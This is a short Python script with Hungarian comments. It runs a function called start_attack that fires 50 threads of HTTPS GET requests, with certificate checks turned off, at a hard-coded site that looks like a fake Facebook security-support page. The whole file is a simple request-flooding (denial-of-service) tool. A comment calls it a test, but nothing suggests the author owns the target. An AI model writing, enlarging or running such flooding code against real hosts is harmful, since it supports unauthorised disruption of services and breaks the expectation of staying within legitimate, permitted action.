import requests
import threading

# Cél URL
TARGET_URL = "https://facebook-security-support-24h-282.tempsite.com"

# Kérés küldése SSL-ellenőrzés kikapcsolásával
def send_request():
    try:
        response = requests.get(TARGET_URL, timeout=5, verify=False)  # SSL ellenőrzés letiltása
        print(f"Response Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

# Többszálú teszt indítása
def start_attack(threads=10):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send_request)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

if __name__ == "__main__":
    # Indítsd el a tesztet
    start_attack(threads=50)